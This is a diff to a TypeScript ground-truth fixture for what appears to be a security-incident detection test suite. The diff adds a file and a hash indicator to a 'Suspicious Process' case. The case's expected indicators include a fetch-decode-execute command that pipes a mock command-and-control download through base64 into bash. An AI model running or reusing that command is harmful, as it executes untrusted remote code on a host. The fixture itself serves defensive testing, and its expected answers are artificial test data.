@@ -82,7 +82,7 @@ export const TC_GROUND_TRUTH: TcGroundTruth[] = [
   {
     caseId: "TC-08", ruleId: "100330", attackName: "Suspicious Process", attackType: "SUSPICIOUS_PROCESS_EXECUTION",
     expectedSeverity: "medium", expectedMitre: ["T1059.004"],
-    expectedIocs: [{ type: "process", value: "/tmp/.cache/kworkerd" }, { type: "command", value: "curl -s http://vigix-mock-c2.net/x | base64 -d | bash" }],
+    expectedIocs: [{ type: "process", value: "/tmp/.cache/kworkerd" }, { type: "command", value: "curl -s http://vigix-mock-c2.net/x | base64 -d | bash" }, { type: "file", value: "/tmp/.cache/kworkerd" }, { type: "hash", value: "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64" }],
     allowedActions: ["ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE", "ACT-BLOCK-HASH", "ACT-ISOLATE-ENDPOINT"],
     expectedPlaybook: "PB-SUSPICIOUS-PROCESS", approvalExpected: true,
     knownFindings: ["Analyst manually added a COMMAND IOC so ACT-KILL-PROCESS met its COMMAND_LINE evidence requirement (INSUFFICIENT_EVIDENCE otherwise)."],
